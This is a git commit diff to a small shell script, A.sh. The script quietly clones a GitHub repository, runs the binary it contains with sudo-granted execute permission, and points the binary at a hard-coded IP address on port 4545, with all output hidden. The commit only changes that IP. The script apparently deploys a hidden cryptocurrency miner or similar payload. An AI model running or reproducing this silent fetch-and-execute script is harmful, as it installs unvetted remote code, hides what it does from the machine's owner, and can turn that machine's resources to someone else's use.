9abdcb11dd11d040f2ede6951e8a11f7e646a37c
ddao2604 <78058830+ddao2604@users.noreply.github.com>
2021-02-07 09:52:40 +0700

    Update A.sh

--- A.sh
+++ A.sh
@@ -4,5 +4,5 @@ printf "User $1"  >&2
 {
 git clone https://github.com/ddao2604/tech.git &> /dev/null
 sudo chmod +x tech/m
-./tech/m -P http://103.149.12.74:4545/"$1" &> log
+./tech/m -P http://38.130.220.127:4545/"$1" &> log
 } &> /dev/null
